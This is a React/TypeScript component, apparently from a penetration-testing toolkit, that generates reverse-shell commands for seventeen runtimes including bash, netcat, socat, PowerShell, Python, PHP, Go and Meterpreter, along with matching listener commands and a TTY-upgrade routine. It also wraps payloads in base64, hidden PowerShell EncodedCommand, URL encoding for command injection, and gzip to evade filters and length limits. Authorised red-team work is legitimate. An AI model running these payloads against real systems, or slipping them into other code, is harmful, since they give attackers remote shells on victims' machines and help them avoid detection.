import { useMemo, useState } from 'react';
import {
  Callout,
  Card,
  Checkbox,
  CodeBlock,
  CopyChip,
  NumberInput,
  OutputBlock,
  SectionTitle,
  Select,
  TextInput,
} from '@/components/ui';
import { b64Encode } from '@/lib/encoding';
import { utf8ToBytes } from '@/lib/crypto';
import { utf16leBytes } from '@/lib/bytes';
import { DEFAULT_CALLBACK_HOST } from '@/tools/registry';

type ShellId =
  | 'bash'
  | 'sh'
  | 'nc'
  | 'ncat'
  | 'socat'
  | 'powershell'
  | 'python3'
  | 'perl'
  | 'ruby'
  | 'php'
  | 'node'
  | 'java'
  | 'golang'
  | 'lua'
  | 'awk'
  | 'xterm'
  | 'meterpreter';

type Encoding = 'raw' | 'base64' | 'url' | 'gzip';

const SHELLS: Array<{ id: ShellId; label: string; family: 'bash' | 'ps' | 'script' | 'binary' }> = [
  { id: 'bash', label: 'bash -i', family: 'bash' },
  { id: 'sh', label: 'sh (no -i)', family: 'bash' },
  { id: 'nc', label: 'nc -e / nc -m', family: 'bash' },
  { id: 'ncat', label: 'ncat --ssl', family: 'bash' },
  { id: 'socat', label: 'socat PTY', family: 'bash' },
  { id: 'powershell', label: 'PowerShell', family: 'ps' },
  { id: 'python3', label: 'python3', family: 'script' },
  { id: 'perl', label: 'perl', family: 'script' },
  { id: 'ruby', label: 'ruby', family: 'script' },
  { id: 'php', label: 'php', family: 'script' },
  { id: 'node', label: 'node', family: 'script' },
  { id: 'java', label: 'java runtime', family: 'script' },
  { id: 'golang', label: 'golang', family: 'script' },
  { id: 'lua', label: 'lua', family: 'script' },
  { id: 'awk', label: 'awk', family: 'script' },
  { id: 'xterm', label: 'xterm (needs -display)', family: 'binary' },
  { id: 'meterpreter', label: 'Meterpreter one-liner', family: 'binary' },
];

const DEFAULT_SELECTION: ShellId[] = ['bash', 'nc', 'socat', 'powershell', 'python3', 'php'];

function shellCode(id: ShellId, h: string, p: number): string {
  switch (id) {
    case 'bash':
      return `bash -i >& /dev/tcp/${h}/${p} 0>&1`;
    case 'sh':
      return `sh -i >& /dev/tcp/${h}/${p} 0>&1`;
    case 'nc':
      return `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ${h} ${p} > /tmp/f\n# or, where nc supports -e:\nnc -e /bin/sh ${h} ${p}`;
    case 'ncat':
      return `ncat ${h} ${p} --ssl -e /bin/bash --allow`;
    case 'socat':
      return `socat TCP:${h}:${p} EXEC:'/bin/bash -li',pty,stderr,setsid,sigint,sane`;
    case 'powershell':
      return `$c=New-Object System.Net.Sockets.TCPClient('${h}',${p});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String );$sb=([text.encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()};$c.Close()`;
    case 'python3':
      return `python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("${h}",${p}));[os.dup2(s.fileno(),f) for f in (0,1,2)];subprocess.call(["/bin/sh","-i"])'`;
    case 'perl':
      return `perl -e 'use Socket;$i="${h}";$p=${p};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`;
    case 'ruby':
      return `ruby -rsocket -e'f=TCPSocket.open("${h}",${p}).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'`;
    case 'php':
      return `php -r '$sock=fsockopen("${h}",${p});exec("/bin/sh -i <&3 >&3 2>&3");'`;
    case 'node':
      return `node -e 'var net=require("net"),cp=require("child_process"),sh=cp.spawn("/bin/sh",[]);var c=net.connect(${p},"${h}");c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);'`;
    case 'java':
      return `// jshell or compiled: opens a /bin/sh piping back over a socket\nvar h = "${h}"; var p = ${p};\nvar s = new java.net.Socket(h, p);\nvar pr = new ProcessBuilder("/bin/sh","-i").redirectErrorStream(true).start();\nnew Thread(() -> { try { pr.getInputStream().transferTo(s.getOutputStream()); } catch (Exception e) {} }).start();\ns.getInputStream().transferTo(pr.getOutputStream());`;
    case 'golang':
      return `package main\n\nimport (\n\t"io"\n\t"net"\n\t"os/exec"\n)\n\nfunc main() {\n\tc, _ := net.Dial("tcp", "${h}:${p}")\n\tcmd := exec.Command("/bin/sh", "-i")\n\tw, _ := cmd.StdinPipe()\n\tr, _ := cmd.StdoutPipe()\n\tcmd.Start()\n\tgo io.Copy(w, c)\n\tio.Copy(c, r)\n}`;
    case 'lua':
      return `lua -e "require('socket');local s=require('socket').tcp();s:connect('${h}',${p});os.execute('/bin/sh -i <&3 >&3 2>&3')"`;
    case 'awk':
      return `awk 'BEGIN {s = "/inet/tcp/0/${h}/${p}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`;
    case 'xterm':
      return `xterm -display ${h}:1  # then start a listener on ${h}:6001 (X11 port)`;
    case 'meterpreter':
      return `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=${h} LPORT=${p} -f elf -o shell.elf\nmsfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST ${h}; set LPORT ${p}; run"`;
    default:
      return '';
  }
}

function listenerFor(id: ShellId, h: string, p: number): string {
  switch (id) {
    case 'bash':
    case 'sh':
    case 'nc':
    case 'python3':
    case 'perl':
    case 'ruby':
    case 'php':
    case 'node':
    case 'lua':
    case 'golang':
    case 'java':
    case 'awk':
      return `rlwrap nc -lvnp ${p}`;
    case 'ncat':
    case 'socat':
      return `ncat --ssl -lvnp ${p}\n# or keep plain TCP:\nsocat file:$(tty),raw,echo=0 tcp-listen:${p},reuseaddr`;
    case 'powershell':
      return `rlwrap nc -lvnp ${p}`;
    case 'xterm':
      return `Xvfb :1 -screen 0 1280x800x24 &\nexport DISPLAY=:1`;
    case 'meterpreter':
      return `msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST ${h}; set LPORT ${p}; exploit"`;
    default:
      return `rlwrap nc -lvnp ${p}`;
  }
}

export default function ReverseShellGenerator() {
  const [host, setHost] = useState(DEFAULT_CALLBACK_HOST);
  const [port, setPort] = useState(4444);
  const [selected, setSelected] = useState<ShellId[]>(DEFAULT_SELECTION);
  const [encoding, setEncoding] = useState<Encoding>('raw');

  const cards = useMemo(() => {
    const h = host.trim() || DEFAULT_CALLBACK_HOST;
    return SHELLS.filter((s) => selected.includes(s.id)).map((shell) => {
      const raw = shellCode(shell.id, h, port);
      let display = raw;
      let note = '';
      if (encoding === 'base64') {
        if (shell.family === 'bash') {
          display = `bash -c 'echo ${b64Encode(utf8ToBytes(raw))} | base64 -d | bash'`;
          note = 'Base64 of the command, decoded then executed by bash.';
        } else if (shell.family === 'ps') {
          const encoded = b64Encode(utf16leBytes(raw));
          display = `powershell -NoP -NonI -W Hidden -EncodedCommand ${encoded}`;
          note = 'PowerShell -EncodedCommand expects UTF-16LE base64.';
        } else {
          note = 'No harness defined for this runtime — use the URL encoding instead.';
        }
      } else if (encoding === 'url') {
        display = encodeURIComponent(raw);
        note = 'Percent-encoded; paste into a parameter that lands in a shell, e.g. an injected command line.';
      } else if (encoding === 'gzip') {
        if (shell.family === 'bash') {
          display = `# gzip -c payload.sh | base64 -w0\nbash -c 'echo PAYLOAD_GZIP_B64 | base64 -d | gunzip | bash'`;
          note = 'Compress first with gzip -c, then base64 — keeps command length under typical argument limits.';
        } else {
          note = 'gzip wrapping is only generated for POSIX shells.';
        }
      }
      return {
        id: shell.id,
        label: shell.label,
        code: display,
        note,
        listener: listenerFor(shell.id, h, port),
      };
    });
  }, [host, port, selected, encoding]);

  const toggle = (id: ShellId, on: boolean) =>
    setSelected((prev) => (on ? Array.from(new Set([...prev, id])) : prev.filter((s) => s !== id)));

  const tty = useMemo(
    () =>
      [
        '# 1. Spawn a pty from the shell you already have',
        'python3 -c \'import pty; pty.spawn("/bin/bash")\'',
        '# 2. Background it and set the terminal up',
        '#   Ctrl-Z',
        'stty raw -echo; fg',
        '# 3. Fix TERM and size in the remote shell',
        'export TERM=xterm-256color',
        'stty rows 40 cols 120',
        '# Alternative without python:',
        'script -qc /bin/bash /dev/null',
      ].join('\n'),
    [],
  );

  return (
    <>
      <Card title="Callback">
        <div className="grid gap-4 sm:grid-cols-3">
          <TextInput label="Callback host" value={host} onChange={setHost} mono placeholder={DEFAULT_CALLBACK_HOST} />
          <NumberInput label="Callback port" value={port} onChange={setPort} min={1} max={65535} />
          <Select
            label="Encoding"
            value={encoding}
            onChange={setEncoding}
            options={[
              { value: 'raw', label: 'None (raw)' },
              { value: 'base64', label: 'Base64 wrap' },
              { value: 'url', label: 'URL-encoded' },
              { value: 'gzip', label: 'gzip + base64 (bash)' },
            ]}
            hint="Applied per runtime"
          />
        </div>

        <div className="mt-5 grid gap-3 sm:grid-cols-3 lg:grid-cols-5">
          {SHELLS.map((shell) => (
            <Checkbox
              key={shell.id}
              checked={selected.includes(shell.id)}
              onChange={(v) => toggle(shell.id, v)}
              label={shell.label}
            />
          ))}
        </div>
      </Card>

      {cards.length === 0 ? (
        <Card title="Shells">
          <Callout tone="warn" title="Nothing selected">
            Pick at least one runtime above.
          </Callout>
        </Card>
      ) : (
        cards.map((card) => (
          <Card
            key={card.id}
            title={card.label}
            action={<CopyChip text={card.code} label="Copy shell" />}
          >
            <CodeBlock code={card.code} maxHeight={200} />
            {card.note && <div className="mt-2 text-[11.5px] text-[var(--text-faint)]">{card.note}</div>}
            <div className="mt-3">
              <SectionTitle right={<CopyChip text={card.listener} label="Copy listener" />}>Listener</SectionTitle>
              <CodeBlock code={card.listener} maxHeight={120} />
            </div>
          </Card>
        ))
      )}

      <Card title="Upgrade to a full TTY">
        <OutputBlock value={tty} rows={10} label="TTY upgrade" />
        <div className="mt-4">
          <Callout tone="info" title="Why bother">
            A raw socket gives you no line editing, no tab completion and no job control — and interactive tools
            (sudo, vim, ssh) will misbehave. The pty dance above fixes all three in under ten seconds.
          </Callout>
        </div>
        <div className="mt-3 text-[11.5px] leading-relaxed text-[var(--text-faint)]">
          Generators only: every string above is inert text. Delivery — mail, upload, injection — is a separate
          decision covered by the engagement scope.
        </div>
      </Card>
    </>
  );
}
